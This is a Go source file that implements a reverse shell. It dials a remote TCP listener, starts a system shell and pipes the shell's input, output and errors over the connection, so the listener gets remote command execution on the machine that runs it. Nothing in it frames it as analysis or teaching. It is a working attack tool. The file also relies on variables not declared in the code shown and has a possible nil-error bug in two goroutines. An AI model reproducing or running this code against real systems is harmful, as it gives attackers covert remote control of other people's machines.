package main

import (
	"fmt"
	"io"
	"net"
	"os/exec"
)

// function designed to connect to the remote listener.
func connect(listenaddr string, listenport int) (err error) {
	shellconn, err = net.Dial("tcp", fmt.Sprintf("%s:%d", listenaddr, listenport))
	if err != nil {
		return err
	}
	return nil
}

// function designed to close the connection and make it nil
func closeConnection() (err error) {
	err = shellconn.Close()
	if err != nil {
		return err
	}
	shellconn = nil
	return nil
}

// function designed to start the secondary shell and feed
// it to the listener.
func StartShell() (err error) {
	var shellcmd *exec.Cmd

	if shellconn == nil {
		return nil
	}

	shellcmd = exec.Command(secondaryshell, secondaryshellargs...)

	// create the pipe for STDIN. this will
	// copy all the remote STDIN to the target,
	// allowing the user to provide shell commands.
	pin, err := shellcmd.StdinPipe()
	if err != nil {
		return err
	}

	// create the pipe for STDOUT. this will
	// copy all the STDOUT traffic from the target
	// to the remote listener.
	pout, err := shellcmd.StdoutPipe()
	if err != nil {
		return err
	}

	// create the pipe for STDERR. this will
	// copy all the STDERR traffic from the target
	// to the remote listener.
	perr, err := shellcmd.StderrPipe()
	if err != nil {
		return err
	}

	// create async copy function for STDOUT.
	go func() {
		_, err = io.Copy(shellconn, pout)
		if err != nil {
			switch err.Error() {
			case io.ErrClosedPipe.Error():
				shellcmd.Process.Kill()
				return
			}
		}
	}()

	// create async copy function for STDERR.
	go func() {
		io.Copy(shellconn, perr)
		switch err.Error() {
		case io.ErrClosedPipe.Error():
			shellcmd.Process.Kill()
			return
		}
	}()

	// create async copy function for STDIN.
	go func() {
		io.Copy(pin, shellconn)
		switch err.Error() {
		case io.ErrClosedPipe.Error():
			shellcmd.Process.Kill()
			return
		}
	}()

	// run shell.
	err = shellcmd.Run()
	if err != nil {
		return err
	}

	return nil
}
